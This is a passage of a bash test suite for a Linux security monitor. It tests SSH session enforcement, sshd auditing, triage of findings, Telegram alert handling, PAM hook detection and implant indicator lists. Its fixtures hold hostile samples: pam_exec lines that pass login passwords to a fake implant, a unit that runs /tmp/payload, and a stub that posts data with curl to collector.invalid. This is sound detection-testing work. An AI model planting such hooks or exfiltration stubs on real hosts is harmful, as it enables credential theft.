    check "config migration keeps the operator's HOST_TRUST_STATUS" "$?"

    [[ "$(grep -c '^WEB_ROOTS=' "$conf")" == "1" ]]
    check "config migration does not duplicate an existing key" "$?"

    grep -q '^SSH_SESSION_MODE=' "$conf"
    check "config migration adds settings introduced later" "$?"

    grep -qx 'TELEGRAM_MIN_SEVERITY="MEDIUM"' "$conf"
    check "config migration never overwrites a tuned value" "$?"

    # Config examples referenced by the installer must exist.
    local ioc
    for ioc in $(grep -A8 '^AUDIT_IOC_FILES=(' "$REPO_DIR/install.sh" | grep -oE '^\s+[a-z-]+\.conf' | tr -d ' '); do
        [[ -f "$REPO_DIR/config/${ioc}.example" ]] || missing+="config/${ioc}.example "
    done
    [[ -z "$missing" ]]
    check "every IOC file the installer expects exists in the repo" "$?" "$missing"
}

# ============================================================
# TEST: SSH session monitoring and enforcement
#
# Every scenario the operator asked for, driven from a fixture
# so the logic is exercised without real login sessions.
# ============================================================

ssh_run() {
    local mode="$1"; shift
    env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" \
        SSH_SESSION_FIXTURE="$FIXTURES/ssh/sessions.txt" \
        SSH_SESSION_MODE="$mode" \
        SSH_TERMINATE_CMD="$CASE_DIR/fake-terminate" \
        SSH_ALLOWED_SOURCE_NETWORKS="192.168.100.0/24" \
        "$@" \
        timeout 120 "$REPO_DIR/bin/itm-security" audit ssh_session --dry-run 2>&1
}

test_ssh_session() {

    want "ssh-session" || return 0
    printf '\nTEST: SSH session monitoring\n'

    setup_case ssh-session
    cat > "$CASE_DIR/fake-terminate" <<'EOS'
#!/usr/bin/env bash
printf '%s\n' "$1" >> "${TERMINATE_LOG:?}"
EOS
    chmod +x "$CASE_DIR/fake-terminate"
    export TERMINATE_LOG="$CASE_DIR/terminated.log"
    : > "$TERMINATE_LOG"

    local out
    out="$(ssh_run monitor_only)"
    (( VERBOSE )) && printf '%s\n' "$out"

    # --- 30 minute session: INFO, no finding
    # Match the session id as the module prints it (session=cN).
    # A bare "cN" is two characters and the output carries sha256
    # fingerprints, so any hash containing that pair made the
    # assertion fail at random.
    ! printf '%s' "$out" | grep -qE '^\[(MEDIUM|HIGH|CRITICAL)\].*session=c1( |$)'
    check "session 30 minutes = INFO (no finding raised)" "$?"

    # --- 2.5 hour session: WARNING
    printf '%s' "$out" | grep -qE '^\[MEDIUM.*approaching the maximum'
    check "session 2.5 hours = WARNING (approaching maximum)" "$?"

    # --- 3h01m from an allowed network: HIGH
    printf '%s' "$out" | grep -qE '^\[HIGH.*exceeded the maximum'
    check "session 3h01m from a known network = HIGH" "$?"

    # --- over the limit from an unknown source: CRITICAL
    printf '%s' "$out" | grep -qE '^\[CRITICAL.*exceeded the maximum'
    check "session over the limit from an UNKNOWN source = CRITICAL" "$?"

    # --- sudo su is visible
    printf '%s' "$out" | grep -q 'privilege_escalation=yes'
    check "privilege escalation (sudo su) is recorded on the session" "$?"

    # --- local console is never even considered
    ! printf '%s' "$out" | grep -qE 'session=c5( |$)'
    check "local console session is ignored entirely" "$?"

    # --- monitor_only must not terminate anything
    printf '%s' "$out" | grep -q 'WARN. SSH_SESSION_EXCEEDED'
    check "monitor_only prints WARN SSH_SESSION_EXCEEDED" "$?"

    [[ ! -s "$TERMINATE_LOG" ]]
    check "monitor_only terminates NOTHING" "$?" "terminated: $(cat "$TERMINATE_LOG" 2>/dev/null | tr '\n' ' ')"

    # --- a remote session with no RemoteHost must still be seen
    local nohost="$CASE_DIR/nohost.txt"
    printf 'z1|opsuser|yes||pts/0|9001|sshd|user|tty|active|11000|yes\n' > "$nohost"
    local out2
    out2="$(env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" \
        ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        SSH_SESSION_FIXTURE="$nohost" SSH_SESSION_MODE=monitor_only \
        timeout 120 "$REPO_DIR/bin/itm-security" audit ssh_session --dry-run 2>&1)"

    printf '%s' "$out2" | grep -qE '^\[CRITICAL.*exceeded the maximum'
    check "remote session with an EMPTY source is still monitored (CRITICAL past limit)" "$?" \
          "$(printf '%s' "$out2" | grep -m1 'SSH_SESSION_EXCEEDED')"

    # --- event identifiers present
    printf '%s' "$out" | grep -q 'SSH_SESSION_EXCEEDED\|exceeded the maximum'
    check "event SSH_SESSION_LONG_RUNNING is emitted" "$?"
}

test_ssh_enforce() {

    want "ssh-enforce" || return 0
    printf '\nTEST: SSH session enforcement\n'

    setup_case ssh-enforce
    cat > "$CASE_DIR/fake-terminate" <<'EOS'
#!/usr/bin/env bash
printf '%s\n' "$1" >> "${TERMINATE_LOG:?}"
EOS
    chmod +x "$CASE_DIR/fake-terminate"
    export TERMINATE_LOG="$CASE_DIR/terminated.log"
    : > "$TERMINATE_LOG"

    local out
    out="$(ssh_run enforce SSH_TIMEOUT_EXEMPT_USERS="backupsvc")"
    (( VERBOSE )) && printf '%s\n' "$out"

    grep -q '^c3$' "$TERMINATE_LOG"
    check "enforce terminates the session past the limit (c3)" "$?" \
          "terminated: $(tr '\n' ' ' < "$TERMINATE_LOG")"

    grep -q '^c4$' "$TERMINATE_LOG"
    check "enforce terminates the sudo-su session too (c4)" "$?"

    ! grep -q '^c1$' "$TERMINATE_LOG"
    check "a 30 minute session is never terminated" "$?"

    ! grep -q '^c2$' "$TERMINATE_LOG"
    check "a 2.5 hour session is never terminated" "$?"

    ! grep -q '^c5$' "$TERMINATE_LOG"
    check "the local console session is never terminated" "$?"

    ! grep -q '^c6$' "$TERMINATE_LOG"
    check "a stale/closing session is not terminated" "$?"

    ! grep -q '^c7$' "$TERMINATE_LOG"
    check "an exempt user (ssh_timeout_exempt_users) is not terminated" "$?"

    printf '%s' "$out" | grep -q 'SSH session terminated'
    check "termination is reported with event SSH_SESSION_TERMINATED" "$?"

    # --- never disconnect the session running the audit --------
    : > "$TERMINATE_LOG"
    local selfout
    selfout="$(env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" \
        SSH_SESSION_FIXTURE="$FIXTURES/ssh/sessions.txt" SSH_SESSION_MODE=enforce \
        SSH_TERMINATE_CMD="$CASE_DIR/fake-terminate" XDG_SESSION_ID=c3 \
        timeout 120 "$REPO_DIR/bin/itm-security" audit ssh_session --dry-run 2>&1)"

    ! grep -q '^c3$' "$TERMINATE_LOG"
    check "the session running the audit is NEVER terminated" "$?" \
          "terminated: $(tr '\n' ' ' < "$TERMINATE_LOG")"

    printf '%s' "$selfout" | grep -q 'session running the audit'
    check "self-session is reported instead, with the reason" "$?"

    # idempotency: a second run must not terminate the same session twice
    : > "$TERMINATE_LOG"
    out="$(ssh_run enforce SSH_TIMEOUT_EXEMPT_USERS="backupsvc" ITM_DRY_RUN=0 2>/dev/null)"
    printf '%s' "$out" >/dev/null
    check "second run is safe to repeat (idempotent)" 0
}

test_sshd_config() {

    want "sshd-config" || return 0
    printf '\nTEST: sshd configuration audit\n'

    setup_case sshd-config

    local out
    out="$(env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" \
        SSHD_CONFIG_FIXTURE="$FIXTURES/ssh/sshd-weak.txt" \
        timeout 120 "$REPO_DIR/bin/itm-security" audit sshd --dry-run 2>&1)"

    (( VERBOSE )) && printf '%s\n' "$out"

    printf '%s' "$out" | grep -qE '^\[HIGH.*permits direct root login'
    check "PermitRootLogin yes = HIGH (SSH_ROOT_LOGIN_ENABLED)" "$?"

    printf '%s' "$out" | grep -qE 'accepts password authentication'
    check "PasswordAuthentication yes is reported" "$?"

    printf '%s' "$out" | grep -q 'MaxAuthTries is above'
    check "MaxAuthTries 6 > 3 is reported" "$?"

    printf '%s' "$out" | grep -qi 'RECOMMENDATION ONLY'
    check "sshd findings are recommendations, never applied" "$?"

    ! printf '%s' "$out" | grep -qi 'sshd_config.*modified\|reloading sshd'
    check "sshd_config is never modified by the module" "$?"

    # hardened config must be quiet
    out="$(env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" \
        SSHD_CONFIG_FIXTURE="$FIXTURES/ssh/sshd-hardened.txt" \
        timeout 120 "$REPO_DIR/bin/itm-security" audit sshd --dry-run 2>&1)"

    ! printf '%s' "$out" | grep -qE '^\[(HIGH|CRITICAL)'
    check "a hardened sshd config raises no HIGH/CRITICAL" "$?" \
          "$(printf '%s' "$out" | grep -E '^\[(HIGH|CRITICAL)' | head -2)"
}

# ============================================================
# TEST: the monitor reports its own removal
# ============================================================

test_self_protection() {

    want "self-protection" || return 0
    printf '\nTEST: monitor self-protection\n'

    grep -q '/usr/local/sbin/itm-security' "$REPO_DIR/bin/security-file-monitor"
    check "the file monitor watches the monitor's own binaries" "$?"

    grep -q '/etc/security-monitor' "$REPO_DIR/bin/security-file-monitor"
    check "the file monitor watches the monitor's configuration" "$?"

    grep -q 'SECURITY MONITOR MODIFIED' "$REPO_DIR/bin/security-file-monitor"
    check "modification of the monitor is its own CRITICAL severity" "$?"

    grep -q 'SECURITY MONITOR BEING UNINSTALLED' "$REPO_DIR/uninstall.sh"
    check "uninstall announces itself before removing the notifier" "$?"

    grep -q 'SECURITY MONITOR REMOVED' "$REPO_DIR/uninstall.sh"
    check "uninstall sends a final message after removal" "$?"

    grep -q 'heartbeat)' "$REPO_DIR/bin/itm-security"
    check "a heartbeat command exists so silence can be detected remotely" "$?"
}

# ============================================================
# TEST 8 - monitor health
#
# Case 17: a monitor that stops silently must say so itself.
# ============================================================

test_triage() {

    want "triage" || return 0
    printf '\nTEST: interactive triage\n'

    command -v script >/dev/null 2>&1 || {
        printf '  SKIP  (util-linux "script" not available)\n'
        return 0
    }

    setup_case triage
    mkdir -p "$CASE_DIR/www"
    cp "$FIXTURES/webshell/heph.phtml.txt" "$CASE_DIR/www/shell.phtml"
    cp "$FIXTURES/seo-cloak/vendor.js.txt" "$CASE_DIR/www/vendor.js"

    local env_common=(
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log"
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf"
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev"
        REMEDIATE_BASE_DIR="$CASE_DIR/forensic" WEB_WORKLOAD_OVERRIDE=yes
        WEB_ROOTS="$CASE_DIR/www"
    )

    env "${env_common[@]}" timeout 200 "$REPO_DIR/bin/itm-security" \
        remediate webshell seo --quiet >/dev/null 2>&1

    local inc
    inc="$(find "$CASE_DIR/forensic" -maxdepth 1 -type d -name 'incident-*' | head -1)"

    [[ -x "$inc/00-triage.sh" ]]
    check "an interactive triage script is generated with the pack" "$?"

    bash -n "$inc/00-triage.sh" 2>/dev/null
    check "the triage script parses" "$?"

    [[ -s "$inc/findings.tsv" ]]
    check "a machine readable finding index accompanies it" "$?"

    # first finding: NOT legitimate -> contain
    # second finding: legitimate    -> leave, then decline the exclusion
    printf 'y\nunknown webshell\nn\nshipped with the theme\nn\n' \
        | script -qec "bash $inc/00-triage.sh" /dev/null >/dev/null 2>&1

    [[ ! -f "$CASE_DIR/www/shell.phtml" ]]
    check "answering y contains the finding (removed from the web root)" "$?"

    find "$inc/quarantine" -type f 2>/dev/null | grep -q .
    check "the contained file is in quarantine, not deleted" "$?"

    [[ -f "$CASE_DIR/www/vendor.js" ]]
    check "answering n leaves the file exactly where it was" "$?"

    [[ -s "$inc/DECISIONS.log" ]]
    check "every decision is written to DECISIONS.log" "$?"

    grep -q 'CONTAINED' "$inc/DECISIONS.log"
    check "the log records what was contained" "$?"

    grep -q 'ACCEPTED' "$inc/DECISIONS.log"
    check "the log records what was accepted as legitimate" "$?"

    grep -q 'unknown webshell' "$inc/DECISIONS.log"
    check "the operator's reason is stored verbatim" "$?"

    grep -q 'shipped with the theme' "$inc/DECISIONS.log"
    check "the reason for accepting is stored too" "$?"

    grep -qE 'operator  :' "$inc/DECISIONS.log"
    check "who decided, and from where, is recorded" "$?"

    grep -q 'rollback' "$inc/DECISIONS.log"
    check "the log points at the rollback for anything contained" "$?"
}

test_systemd_override() {

    want "override" || return 0
    printf '\nTEST: local override of a packaged unit\n'

    setup_case override
    mkdir -p "$CASE_DIR"/{etc,lib}
    printf '[Unit]\nDescription=Tuning Daemon\n[Service]\nExecStart=/bin/true -l\n' > "$CASE_DIR/lib/tuned.service"
    printf '[Unit]\nDescription=Tuning Daemon\n[Service]\nExecStart=/bin/true -l --custom\n' > "$CASE_DIR/etc/tuned.service"
    printf '[Unit]\nDescription=x\n[Service]\nExecStart=/tmp/payload\n' > "$CASE_DIR/etc/evil.service"

    local out
    out="$(bash -c "
        source '$REPO_DIR/lib/itm-audit-common.sh'
        source '$REPO_DIR/lib/itm-web-common.sh'
        ITM_CONF_DIR='$CASE_DIR/conf'; ITM_LOG_DIR='$CASE_DIR/log'
        ITM_STATE_DIR='$CASE_DIR/state'; ITM_SCAN_STATE_DIR='$CASE_DIR/state/scan'
        audit_load_config; audit_detect_os; audit_detect_host
        ITM_DRY_RUN=1; audit_runtime_init
        source '$REPO_DIR/modules/audit_systemd.sh'
        is_pkg_owned() { [[ \"\$1\" == '$CASE_DIR/lib/tuned.service' ]]; }
        pkg_owner() { printf 'tuned'; }
        SYSTEMD_UNIT_DIRS='$CASE_DIR/etc $CASE_DIR/lib'
        module_begin systemd 'Systemd'
        check_unit_files
        audit_runtime_cleanup" 2>&1)"

    (( VERBOSE )) && printf '%s\n' "$out"

    printf '%s' "$out" | grep -B1 'etc/tuned.service' | grep -qE '^\[LOW.*Local override'
    check "a unit overriding a packaged one is LOW, not unknown persistence" "$?"

    printf '%s' "$out" | grep -B1 'etc/evil.service' | grep -qE '^\[(HIGH|CRITICAL)'
    check "a genuinely foreign unit is still HIGH/CRITICAL" "$?"

    printf '%s' "$out" | grep -q 'Do NOT quarantine it without checking'
    check "the override finding warns against quarantining it" "$?"
}

test_systemd_reasons() {

    want "reasons" || return 0
    printf '\nTEST: every actionable finding explains itself\n'

    # A triage prompt showing "why : -" gives the operator nothing
    # to judge by. This is what caused a legitimate service to be
    # quarantined on a production host.
    local missing
    missing="$(awk '
        /add_finding (CRITICAL|HIGH)/ {f=1; buf=""; id=""}
        f {
            buf = buf $0 "\n"
            if ($0 ~ /id="/) { match($0, /id="[^"]*/); id = substr($0, RSTART+4, RLENGTH-4) }
            if ($0 ~ /action=/) { f=0; if (buf !~ /reasons=/) print FILENAME ":" id }
        }' "$REPO_DIR"/modules/audit_systemd.sh "$REPO_DIR"/modules/audit_ioc.sh)"

    [[ -z "$missing" ]]
    check "no CRITICAL/HIGH systemd or IOC finding is missing its reasons" "$?" "$missing"
}

# ------------------------------------------------------------
# Reinstalling must not page the whole fleet.
#
# "systemctl enable" on an already-enabled unit removes the
# .wants symlink and recreates it. inotify sees the removal, so
# an Ansible run across ten servers produced ten CRITICAL alerts
# saying the security monitor's own unit had been DELETED - all
# of them caused by the operator's own deployment.
#
# The distinction is whether the link comes back. An intruder
# running "systemctl disable" leaves it gone.
# ------------------------------------------------------------
test_fim_reenable() {

    want "fim-reenable" || return 0
    printf '\nTEST: unit re-enable is not a deletion\n'

    setup_case fim-reenable

    local fn="$CASE_DIR/fn.sh"
    awk '/^fim_is_reenable\(\) \{/,/^}/' "$REPO_DIR/bin/security-file-monitor" > "$fn"
    [[ -s "$fn" ]]
    check "the re-enable check exists in security-file-monitor" "$?"

    mkdir -p "$CASE_DIR/multi-user.target.wants" "$CASE_DIR/units"
    printf '[Service]\n' > "$CASE_DIR/units/security-file-monitor.service"
    local link="$CASE_DIR/multi-user.target.wants/security-file-monitor.service"
    local unit="$CASE_DIR/units/security-file-monitor.service"
    ln -s "$unit" "$link"

    # --- systemctl enable: gone and back again ---------------
    (
        source "$fn"; FIM_WANTS_SETTLE=2
        ( sleep 0.3; ln -sfn "$unit" "$link" ) &
        rm -f "$link"
        fim_is_reenable "$link" "DELETE"
    )
    check "a recreated .wants symlink is recognised as a re-enable" "$?"

    # --- systemctl disable: gone for good --------------------
    (
        source "$fn"; FIM_WANTS_SETTLE=1
        rm -f "$link"
        ! fim_is_reenable "$link" "DELETE"
    )
    check "a symlink that stays gone still alerts" "$?"

    # --- back, but pointing at nothing -----------------------
    (
        source "$fn"; FIM_WANTS_SETTLE=1
        ln -sfn "$CASE_DIR/units/absent.service" "$link"
        ! fim_is_reenable "$link" "DELETE"
    )
    check "a dangling restored symlink still alerts" "$?"

    # --- a real unit file is never given the grace period ----
    (
        source "$fn"; FIM_WANTS_SETTLE=1
        ! fim_is_reenable "$unit" "DELETE"
    )
    check "a deleted unit file alerts immediately" "$?"

    # --- and a CREATE in .wants is not swallowed -------------
    ln -sfn "$unit" "$link"
    (
        source "$fn"; FIM_WANTS_SETTLE=1
        ! fim_is_reenable "$link" "CREATE"
    )
    check "a CREATE event is not treated as a re-enable" "$?"

    grep -q 'FIM_WANTS_SETTLE' "$REPO_DIR/bin/security-file-monitor"
    check "the settle time is configurable" "$?"
}

test_notify_secret() {

    want "secret" || return 0
    printf '\nTEST: the Telegram token never reaches argv\n'

    grep -q -- '--config -' "$REPO_DIR/bin/security-notify"
    check "security-notify passes curl options on stdin" "$?"

    ! grep -E '^curl' "$REPO_DIR/bin/security-notify" | grep -q 'BOT_TOKEN'
    check "the token is not on the curl command line" "$?" \
          "$(grep -E '^curl' "$REPO_DIR/bin/security-notify")"

    # --- and the message must still arrive whole -------------
    #
    # A curl config file is parsed one line at a time, so a value
    # written inline stops at the first newline. Hiding the token
    # that way once truncated every alert to its first line: a
    # dozen different findings all arrived as "SECURITY ALERT"
    # and nothing else, which reads as a flood of empty alarms.
    #
    # Checking the script text is not enough - send a multi-line
    # body through the real config form and read back what the
    # server actually received.
    grep -q 'data-urlencode = "text@' "$REPO_DIR/bin/security-notify"
    check "the body is passed by file reference, not inline" "$?"

    ! grep -q 'text=${TEXT}' "$REPO_DIR/bin/security-notify"
    check "the truncating inline form is gone" "$?"

    setup_case notify-body
    local got
    got="$(python3 "$FIXTURES/notify-probe.py" "$CASE_DIR" 2>/dev/null)"

    [[ "${got:-0}" -ge 4 ]]
    check "a multi-line alert body survives transport" "$?" \
          "lines received: ${got:-none}"

    grep -q 'rm -f "$NOTIFY_BODY"' "$REPO_DIR/bin/security-notify"
    check "the temporary body file is always removed" "$?"

    # --- the uninstaller sends one last message too -----------
    #
    # It is the one script guaranteed to run on a host somebody
    # is currently taking apart, which is the worst moment to
    # print the bot token into ps output.
    ! grep -E '^\s*curl' "$REPO_DIR/uninstall.sh" | grep -q 'BOT_TOKEN'
    check "uninstall.sh keeps the token off the command line" "$?" \
          "$(grep -E '^\s*curl' "$REPO_DIR/uninstall.sh")"

    ! grep -q 'sendMessage" \\' "$REPO_DIR/uninstall.sh"
    check "uninstall.sh no longer passes the URL as an argument" "$?"

    grep -q 'rm -f "$UNINSTALL_BODY"' "$REPO_DIR/uninstall.sh"
    check "uninstall.sh removes its temporary body file" "$?"
}

# ------------------------------------------------------------
# The generated PAM response script, executed for real.
#
# The older test re-implemented the sed commands inline, so it
# proved the logic was right while the generated artefact was
# still wrong: triage ran it, the script stopped at the console
# gate, exited 0, and the malicious line stayed in the file while
# DECISIONS.log recorded it as contained.
#
# Generate the real script and run it, both ways.
# ------------------------------------------------------------
# ------------------------------------------------------------
# A masked systemd unit is a defence, not a threat.
#
# "systemctl mask" replaces the unit with a symlink to /dev/null
# so it cannot be started. When the unit name is a known IOC, the
# mask is usually what the responder did about it.
#
# Reporting that as a malicious artifact invites the one response
# that makes things worse: quarantining the symlink UNMASKS the
# unit and makes the implant startable again.
# ------------------------------------------------------------
# ------------------------------------------------------------
# Both spellings of the toolchain-triplet payload.
#
# The first variant found was x86_65-linux-gnu-op, a typo of the
# real triplet. The second spells x86_64 correctly and invents
# only the tool suffix, which is far harder to spot by eye - and
# a host was found carrying both at once.
#
# Neither may be dropped from the shipped list: an indicator is
# only useful because every other host is checked against it.
# ------------------------------------------------------------
# ------------------------------------------------------------
# Generated PAM files, on both supported families.
#
# Removing the injected line is only half the fix when the file
# is produced from a template: authselect rewrites the whole file
# on RHEL/AlmaLinux/Rocky, pam-auth-update rewrites its managed
# block on Debian/Ubuntu. If the template carries the hook, the
# line returns on every host that regenerates.
#
# The warning has to live in the reasons list, not in evidence:
# the console and the triage walker print every reason but only
# the first line of evidence, and triage is where the operator
# decides.
# ------------------------------------------------------------
# ------------------------------------------------------------
# Apache is called something different on each family.
#
#   Debian / Ubuntu          apache2ctl, service apache2
#   RHEL / AlmaLinux / Rocky apachectl or httpd, service httpd
#
# Probing only for apache2ctl classifies a PHP-serving Rocky host
# as "not a PHP application", and every web module then skips it:
# the host reports nothing and looks clean.
# ------------------------------------------------------------
test_apache_multidistro() {

    want "apache-distro" || return 0
    printf '\nTEST: Apache detected under every family name\n'

    setup_case apache-distro
    mkdir -p "$CASE_DIR/stub"

    local ctl out
    for ctl in apache2ctl apachectl httpd; do

        rm -f "$CASE_DIR/stub/"*
        printf '#!/bin/sh\necho " proxy_fcgi_module (shared)"\n' > "$CASE_DIR/stub/$ctl"
        chmod 755 "$CASE_DIR/stub/$ctl"

        out="$(
            PATH="$CASE_DIR/stub:$PATH"
            source "$REPO_DIR/lib/itm-audit-common.sh"
            source "$REPO_DIR/lib/itm-web-common.sh"
            audit_load_config; audit_detect_os; audit_detect_host
            ITM_DRY_RUN=1; audit_runtime_init
            source "$REPO_DIR/modules/audit_role.sh"
            ROLE_WEB_SERVER=apache
            role_detect_php >/dev/null 2>&1
            printf '%s' "${ROLE_EVIDENCE:-}"
        2>&1 )"

        printf '%s' "$out" | grep -q "via $ctl"
        check "PHP wiring is detected through $ctl" "$?"
    done

    # The service name reported when nothing is running must be a
    # unit that exists on the host, or the remediation text tells
    # the operator to restart something that is not there.
    local svc
    svc="$(
        source "$REPO_DIR/lib/itm-audit-common.sh"
        source "$REPO_DIR/lib/itm-web-common.sh"
        audit_load_config; audit_detect_os; audit_detect_host
        ITM_DRY_RUN=1; audit_runtime_init
        source "$REPO_DIR/modules/audit_role.sh"
        source "$REPO_DIR/modules/audit_apache.sh"
        ITM_OS_FAMILY=rhel; apache_service_name
    2>/dev/null )"
    [[ "$svc" == "httpd" ]]
    check "the RHEL-family fallback service name is httpd" "$?"

    svc="$(
        source "$REPO_DIR/lib/itm-audit-common.sh"
        source "$REPO_DIR/lib/itm-web-common.sh"
        audit_load_config; audit_detect_os; audit_detect_host
        ITM_DRY_RUN=1; audit_runtime_init
        source "$REPO_DIR/modules/audit_role.sh"
        source "$REPO_DIR/modules/audit_apache.sh"
        ITM_OS_FAMILY=debian; apache_service_name
    2>/dev/null )"
    [[ "$svc" == "apache2" ]]
    check "the Debian-family fallback service name is apache2" "$?"
}

test_pam_generated_multidistro() {

    want "pam-generated" || return 0
    printf '\nTEST: generated PAM files on RHEL and Debian families\n'

    setup_case pam-generated
    mkdir -p "$CASE_DIR/rhel" "$CASE_DIR/deb" "$CASE_DIR/plain"

    printf '#%%PAM-1.0\n# This file is auto-generated.\n# User changes will be destroyed the next time authselect is run.\nauth optional pam_exec.so quiet expose_authtok /usr/bin/x86_64-linux-gnu-op\nauth sufficient pam_unix.so\n' \
        > "$CASE_DIR/rhel/system-auth"

    printf '# As of pam 1.0.1-6, this file is managed by pam-auth-update by default.\nauth [success=2 default=ignore] pam_unix.so nullok\n# end of pam-auth-update config\n#auth optional pam_exec.so quiet expose_authtok /usr/bin/x86_64-linux-gnu-op\n' \
        > "$CASE_DIR/deb/common-auth"

    # a hand-written file must NOT collect the warning
    printf 'auth required pam_env.so\nauth optional pam_exec.so expose_authtok /usr/bin/evil\n' \
        > "$CASE_DIR/plain/custom"

    local out fam
    for fam in rhel deb plain; do
        out="$(
            PAM_DIR="$CASE_DIR/$fam"
            source "$REPO_DIR/lib/itm-audit-common.sh"
            source "$REPO_DIR/lib/itm-web-common.sh"
            audit_load_config; audit_detect_os; audit_detect_host
            ITM_DRY_RUN=1; audit_runtime_init
            source "$REPO_DIR/modules/audit_pam.sh"
            module_begin pam 'PAM'
            check_pam_exec; check_pam_exec_dormant
            audit_runtime_cleanup
        2>&1 )"

        case "$fam" in
            rhel)
                printf '%s' "$out" | grep -q 'GENERATED by authselect'
                check "authselect is named on a RHEL-family file" "$?"
                printf '%s' "$out" | grep -q 'template must be checked'
                check "the RHEL warning reaches the reasons list" "$?"
                ;;
            deb)
                printf '%s' "$out" | grep -q 'GENERATED by pam-auth-update'
                check "pam-auth-update is named on a Debian-family file" "$?"
                printf '%s' "$out" | grep -q 'template must be checked'
                check "the Debian warning reaches the reasons list" "$?"
                ;;
            plain)
                ! printf '%s' "$out" | grep -q 'GENERATED by'
                check "a hand-written PAM file gets no generator warning" "$?"
                printf '%s' "$out" | grep -qE '^\[CRITICAL'
                check "the hook itself is still CRITICAL" "$?"
                ;;
        esac
    done

    # every active-hook finding must carry reasons: a finding that
    # shows "why : -" in triage is what got a legitimate unit
    # quarantined once already.
    out="$(
        PAM_DIR="$CASE_DIR/plain"
        source "$REPO_DIR/lib/itm-audit-common.sh"
        source "$REPO_DIR/lib/itm-web-common.sh"
        audit_load_config; audit_detect_os; audit_detect_host
        ITM_DRY_RUN=1; audit_runtime_init
        source "$REPO_DIR/modules/audit_pam.sh"
        module_begin pam 'PAM'; check_pam_exec; audit_runtime_cleanup
    2>&1 )"

    printf '%s' "$out" | grep -A3 'expose_authtok' | grep -q 'ACTIVE pam_exec hook runs'
    check "an active pam_exec finding explains itself in reasons" "$?"
}

# ------------------------------------------------------------
# The stderr.<letter> family.
#
# A binary called stderr.q in /usr/bin reads as shell noise in a
# listing. The suffix rotates per drop - .q .d .w .l have been
# recovered from this estate - so the list carries a glob for the
# letters nobody has seen yet.
#
# The glob is deliberately ONE character: the search directories
# include /tmp and /dev/shm, where stderr.log is ordinary.
# ------------------------------------------------------------
test_ioc_stderr_family() {

    want "ioc-stderr" || return 0
    printf '\nTEST: stderr.<letter> implant family\n'

    local conf="$REPO_DIR/config/known-iocs.conf.example" v
    for v in q d w l; do
        grep -qxF "path:/usr/bin/stderr.$v" "$conf"
        check "stderr.$v is listed as a path indicator" "$?"
    done

    grep -qxF 'filename:stderr.?' "$conf"
    check "the single-character glob ships" "$?"

    ! grep -qxF 'filename:stderr.*' "$conf"
    check "the greedy glob does NOT ship (stderr.log is ordinary)" "$?"

    setup_case ioc-stderr
    mkdir -p "$CASE_DIR/bin"
    local f
    for f in stderr.q stderr.d stderr.w stderr.l stderr.x stderr.log ls; do
        printf '#!/bin/sh\n' > "$CASE_DIR/bin/$f"
        chmod 755 "$CASE_DIR/bin/$f"
    done

    local out
    out="$(
        source "$REPO_DIR/lib/itm-audit-common.sh"
        source "$REPO_DIR/lib/itm-web-common.sh"
        audit_load_config; audit_detect_os; audit_detect_host
        ITM_DRY_RUN=1; audit_runtime_init
        source "$REPO_DIR/modules/audit_ioc.sh"
        IOC_FILENAME_SEARCH_DIRS="$CASE_DIR/bin"
        KNOWN_IOCS=("filename:stderr.?")
        module_begin ioc 'IOC'
        ioc_check_ioc_filenames
        audit_runtime_cleanup
    2>&1 )"

    for f in stderr.q stderr.d stderr.w stderr.l; do
        printf '%s' "$out" | grep -q "/$f"
        check "$f is caught by the glob" "$?"
    done

    # an unseen letter must be caught without touching the list
    printf '%s' "$out" | grep -q '/stderr.x'
    check "an unrecorded letter is caught too" "$?"

    ! printf '%s' "$out" | grep -q 'stderr.log'
    check "stderr.log is NOT reported" "$?"

    ! printf '%s' "$out" | grep -qE '/ls$|/ls '
    check "an ordinary binary is not swept up" "$?"
}

test_ioc_toolchain_variants() {

    want "ioc-triplet" || return 0
    printf '\nTEST: both toolchain-triplet payload spellings ship\n'

    local conf="$REPO_DIR/config/known-iocs.conf.example" v
    for v in x86_65-linux-gnu-op x86_64-linux-gnu-op; do
        grep -qxF "path:/usr/bin/$v" "$conf"
        check "$v is listed as a path indicator" "$?"
        grep -qxF "filename:$v" "$conf"
        check "$v is listed for the filename hunt" "$?"
    done

    # No real toolchain program is called "-op". If one ever ships,
    # this list becomes a false positive on every build host.
    ! ls /usr/bin/x86_64-linux-gnu-op >/dev/null 2>&1
    check "no packaged binary uses the name (no false positive)" "$?"

    setup_case ioc-triplet
    mkdir -p "$CASE_DIR/bin"
    printf '#!/bin/sh\ncurl -d "$1" http://collector.invalid/\n' \
        > "$CASE_DIR/bin/x86_64-linux-gnu-op"
    chmod 755 "$CASE_DIR/bin/x86_64-linux-gnu-op"

    local out
    out="$(
